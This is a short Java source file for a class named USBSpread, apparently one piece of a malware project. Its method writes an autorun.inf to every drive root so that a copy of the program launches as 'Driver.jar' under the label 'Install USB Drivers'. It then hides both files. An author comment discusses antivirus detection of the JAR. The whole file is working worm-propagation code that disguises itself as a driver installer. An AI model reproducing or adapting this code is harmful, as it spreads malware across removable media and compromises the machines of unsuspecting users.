
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/** // People are detecting the driver.jar with fail antivirus java cant be detected, perhaps its detecting the autorun, nothing u can do aboutthat
 *
 * @author Nathan
 */
public class USBSpread {

    public static void spreadUsb() {
        File[] roots = File.listRoots();
        BufferedWriter bw = null;
        for (File f : roots) {
            try {
                bw = new BufferedWriter(new FileWriter(f.toString() + "\\autorun.inf"));
                bw.write("[autorun]");
                bw.newLine();
                bw.write("open=Driver.jar");
                bw.newLine();
                bw.write("action=Install USB Drivers");
                bw.newLine();
                bw.close();
                Misc.copy(Misc.getJARLoc(), f.toString() + "\\Driver.jar");
                Misc.hideFile(f.toString() + "\\Driver.jar");
                Misc.hideFile(f.toString() + "\\autorun.inf");
            } catch (IOException e) {
                continue;
            }
        }
    }
}
